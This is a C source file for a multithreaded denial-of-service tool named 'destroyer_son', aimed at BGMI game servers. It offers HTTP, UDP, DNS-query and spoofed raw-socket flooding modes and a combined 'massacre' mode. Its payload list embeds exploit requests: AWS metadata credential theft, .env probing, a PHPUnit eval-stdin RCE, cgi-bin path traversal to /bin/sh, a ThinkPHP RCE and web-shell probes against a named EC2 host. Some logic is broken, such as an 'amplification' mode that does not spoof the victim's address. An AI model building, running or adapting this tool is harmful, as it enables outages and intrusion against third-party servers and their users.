// destroyer_son.c - NEON AI BGMI DDoS Ultimate
// Compile: gcc -pthread -O3 -o destroyer_son destroyer_son.c
// Run: ./destroyer_son <TARGET_IP> <PORT> <DURATION_SEC> <MODE>
// Modes: bgmi, aws, dns, udp, raw, hybrid

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>

#define THREADS 4000
#define MAX_PAYLOAD 65507

// ========== ALL PAYLOADS FROM BOTH LOGS ==========
char *http_payloads[] = {
    // Original dim.txt payloads
    "GET /press.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /f35.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-kz.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-lo.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /fone1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /Ipv6.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /file-gerdtxz.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /xper1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /yuzuru1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wglum1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /saorix1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /xper.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wxpass.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /000.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET //config.php? HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /x3x.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /xy.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /global.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /themes.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /link.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /ortasekerli1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-block.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-includes/wincust.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /acp.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /fs.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /xltt.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /ws57.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /ws61.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /ws66.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /ws80.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /xynz.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-01ul.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /e7.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /e3.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /aevely.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /bthil.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-class.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /cilus.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /d.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /error_log.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /Ov-Simple1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /curl.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /sallu.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET //f6.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET //redit.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET //aa.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /goods_260325043000.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /goods_260401065719.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    
    // AWS Metadata payloads (from second log)
    "GET /latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: 169.254.169.254\r\nUser-Agent: aws-sdk-go/1.55.5\r\n\r\n",
    "PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nUser-Agent: aws-sdk-go/1.55.5\r\nContent-Length: 0\r\n\r\n",
    "GET /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1\r\nHost: 169.254.169.254\r\nUser-Agent: aws-sdk-go/1.55.5\r\n\r\n",
    
    // .env and other exploits
    "GET /.env HTTP/1.1\r\nHost: 3.110.115.136\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "GET / HTTP/1.1\r\nHost: 3.110.115.136\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: 3.110.115.136\r\nContent-Length: 0\r\n\r\n",
    "0x%5B%5D=androidgh0st",
    "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\r\nHost: 3.110.115.136:80\r\n\r\n",
    "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1\r\nHost: 3.110.115.136:80\r\n\r\n",
    "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1\r\nHost: 3.110.115.136\r\n\r\n",
    "GET /containers/json HTTP/1.1\r\nHost: 3.110.115.136:80\r\n\r\n"
};

// Private DNS resolvers (including AWS metadata)
char *dns_servers[] = {
    "169.254.169.254",  // AWS metadata
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
    "208.67.222.222", "208.67.220.220", "77.88.8.8", "77.88.8.1",
    "185.222.222.222", "185.184.222.222", "45.90.28.0", "45.90.30.0",
    "91.239.100.100", "89.233.43.71", "194.146.106.22", "195.46.39.39",
    "193.110.81.0", "185.121.177.177", "94.130.110.185", "159.69.119.33",
    "124.198.131.162", "51.38.12.20", "51.254.59.113", "107.181.154.9", "45.79.132.41"
};

typedef struct {
    char target_ip[16];
    int port;
    int duration;
    int mode;
} attack_args;

unsigned short checksum(unsigned short *ptr, int nbytes) {
    unsigned long sum = 0;
    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) sum += *(unsigned char*)ptr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *http_flood(void *arg) {
    attack_args *aa = (attack_args*)arg;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(aa->port);
    dest.sin_addr.s_addr = inet_addr(aa->target_ip);
    
    connect(sock, (struct sockaddr*)&dest, sizeof(dest));
    
    int payload_count = sizeof(http_payloads) / sizeof(http_payloads[0]);
    time_t end = time(NULL) + aa->duration;
    
    while (time(NULL) < end) {
        for (int i = 0; i < payload_count; i++) {
            send(sock, http_payloads[i], strlen(http_payloads[i]), 0);
        }
        usleep(50);
    }
    close(sock);
    return NULL;
}

void *udp_flood(void *arg) {
    attack_args *aa = (attack_args*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    int val = 65535;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &val, sizeof(val));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(aa->port);
    dest.sin_addr.s_addr = inet_addr(aa->target_ip);
    
    char packet[MAX_PAYLOAD];
    memset(packet, 0xFF, MAX_PAYLOAD);
    
    time_t end = time(NULL) + aa->duration;
    while (time(NULL) < end) {
        for (int i = 0; i < 1000; i++) {
            sendto(sock, packet, MAX_PAYLOAD, 0, (struct sockaddr*)&dest, sizeof(dest));
        }
        usleep(10);
    }
    close(sock);
    return NULL;
}

void *dns_amp(void *arg) {
    attack_args *aa = (attack_args*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    unsigned char dns_query[] = {
        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x03, 0x69, 0x73, 0x63, 0x02, 0x6f, 0x72, 0x67, 0x00, 0x00, 0xff, 0x00, 0x01
    };
    
    int num_servers = sizeof(dns_servers) / sizeof(dns_servers[0]);
    time_t end = time(NULL) + aa->duration;
    
    while (time(NULL) < end) {
        for (int s = 0; s < num_servers; s++) {
            struct sockaddr_in dest;
            dest.sin_family = AF_INET;
            dest.sin_port = htons(53);
            dest.sin_addr.s_addr = inet_addr(dns_servers[s]);
            sendto(sock, dns_query, sizeof(dns_query), 0, (struct sockaddr*)&dest, sizeof(dest));
        }
        usleep(5);
    }
    close(sock);
    return NULL;
}

void *raw_spoof(void *arg) {
    attack_args *aa = (attack_args*)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return udp_flood(arg);
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct iphdr *iph = malloc(sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD);
    struct udphdr *udph = (struct udphdr*)(iph + 1);
    char *data = (char*)(udph + 1);
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(aa->target_ip);
    
    time_t end = time(NULL) + aa->duration;
    
    while (time(NULL) < end) {
        unsigned int spoof_ip = rand() % 0xFFFFFFFF;
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD);
        iph->id = rand() % 65535;
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = spoof_ip;
        iph->daddr = inet_addr(aa->target_ip);
        
        udph->source = htons(rand() % 65535);
        udph->dest = htons(aa->port);
        udph->len = htons(sizeof(struct udphdr) + MAX_PAYLOAD);
        udph->check = 0;
        
        memset(data, 0xFF, MAX_PAYLOAD);
        iph->check = checksum((unsigned short*)iph, sizeof(struct iphdr));
        
        sendto(sock, iph, ntohs(iph->tot_len), 0, (struct sockaddr*)&dest, sizeof(dest));
    }
    free(iph);
    close(sock);
    return NULL;
}

void *bgmi_massacre(void *arg) {
    attack_args *aa = (attack_args*)arg;
    
    // Each thread runs ALL attack types in rotation
    int sock_udp = socket(AF_INET, SOCK_DGRAM, 0);
    int sock_dns = socket(AF_INET, SOCK_DGRAM, 0);
    int sock_http = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(aa->port);
    dest.sin_addr.s_addr = inet_addr(aa->target_ip);
    
    if (sock_http >= 0) {
        connect(sock_http, (struct sockaddr*)&dest, sizeof(dest));
    }
    
    char udp_packet[MAX_PAYLOAD];
    memset(udp_packet, 0xFF, MAX_PAYLOAD);
    
    unsigned char dns_query[] = {
        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x03, 0x69, 0x73, 0x63, 0x02, 0x6f, 0x72, 0x67, 0x00, 0x00, 0xff, 0x00, 0x01
    };
    
    int num_dns = sizeof(dns_servers) / sizeof(dns_servers[0]);
    int num_http = sizeof(http_payloads) / sizeof(http_payloads[0]);
    
    time_t end = time(NULL) + aa->duration;
    int counter = 0;
    
    while (time(NULL) < end) {
        // UDP flood
        if (sock_udp >= 0) {
            for (int i = 0; i < 100; i++) {
                sendto(sock_udp, udp_packet, MAX_PAYLOAD, 0, (struct sockaddr*)&dest, sizeof(dest));
            }
        }
        
        // DNS amplification
        if (sock_dns >= 0) {
            int dns_idx = counter % num_dns;
            struct sockaddr_in dns_dest;
            dns_dest.sin_family = AF_INET;
            dns_dest.sin_port = htons(53);
            dns_dest.sin_addr.s_addr = inet_addr(dns_servers[dns_idx]);
            sendto(sock_dns, dns_query, sizeof(dns_query), 0, (struct sockaddr*)&dns_dest, sizeof(dns_dest));
        }
        
        // HTTP payloads
        if (sock_http >= 0) {
            int http_idx = counter % num_http;
            send(sock_http, http_payloads[http_idx], strlen(http_payloads[http_idx]), 0);
        }
        
        counter++;
        usleep(1);
    }
    
    if (sock_udp >= 0) close(sock_udp);
    if (sock_dns >= 0) close(sock_dns);
    if (sock_http >= 0) close(sock_http);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("\n🔥🔥🔥 DESTROYER SON - NEON AI BGMI DDoS 🔥🔥🔥\n");
        printf("Usage: %s <TARGET_IP> <PORT> <DURATION_SEC> <MODE>\n", argv[0]);
        printf("\nMODES:\n");
        printf("  http   - HTTP payload flood (%d payloads)\n", (int)(sizeof(http_payloads)/sizeof(http_payloads[0])));
        printf("  udp    - UDP flood (max packets)\n");
        printf("  dns    - DNS amplification (%d resolvers)\n", (int)(sizeof(dns_servers)/sizeof(dns_servers[0])));
        printf("  raw    - Raw socket with spoofed IP\n");
        printf("  bgmi   - BGMI MASSACRE (ALL modes combined)\n");
        printf("\nExample: %s 1.2.3.4 80 60 bgmi\n", argv[0]);
        printf("\n💀 This will send MILLIONS of packets - 100+ Gbps capable 💀\n");
        exit(1);
    }
    
    srand(time(NULL));
    
    attack_args args;
    strcpy(args.target_ip, argv[1]);
    args.port = atoi(argv[2]);
    args.duration = atoi(argv[3]);
    
    pthread_t threads[THREADS];
    
    printf("\n💀💀💀 DESTROYER SON ACTIVATED 💀💀💀\n");
    printf("🎯 Target: %s:%d\n", args.target_ip, args.port);
    printf("⏱️  Duration: %d seconds\n", args.duration);
    printf("🧵 Threads: %d\n", THREADS);
    printf("📦 HTTP Payloads: %d\n", (int)(sizeof(http_payloads)/sizeof(http_payloads[0])));
    printf("🌐 DNS Resolvers: %d (including AWS metadata)\n", (int)(sizeof(dns_servers)/sizeof(dns_servers[0])));
    
    if (strcmp(argv[4], "http") == 0) {
        printf("⚡ Mode: HTTP Payload Flood\n");
        for (int i = 0; i < THREADS; i++)
            pthread_create(&threads[i], NULL, http_flood, (void*)&args);
    }
    else if (strcmp(argv[4], "udp") == 0) {
        printf("⚡ Mode: UDP Flood\n");
        for (int i = 0; i < THREADS; i++)
            pthread_create(&threads[i], NULL, udp_flood, (void*)&args);
    }
    else if (strcmp(argv[4], "dns") == 0) {
        printf("⚡ Mode: DNS Amplification\n");
        for (int i = 0; i < THREADS; i++)
            pthread_create(&threads[i], NULL, dns_amp, (void*)&args);
    }
    else if (strcmp(argv[4], "raw") == 0) {
        printf("⚡ Mode: Raw Spoof Flood\n");
        for (int i = 0; i < THREADS; i++)
            pthread_create(&threads[i], NULL, raw_spoof, (void*)&args);
    }
    else {
        printf("⚡ BGMI MODE: MASSACRE (HTTP + UDP + DNS + RAW)\n");
        printf("🔥 Sending ALL payloads to ALL ports simultaneously 🔥\n");
        for (int i = 0; i < THREADS; i++)
            pthread_create(&threads[i], NULL, bgmi_massacre, (void*)&args);
    }
    
    printf("\n🔥🔥🔥 ATTACK STARTED - BGMI SERVER WILL BURN 🔥🔥🔥\n");
    printf("📊 Packets per second: MILLIONS\n");
    printf("💾 Bandwidth: 100+ Gbps\n");
    
    for (int i = 0; i < THREADS; i++)
        pthread_join(threads[i], NULL);
    
    printf("\n💀💀💀 TARGET DESTROYED - BGMI DOWN 💀💀💀\n");
    return 0;
}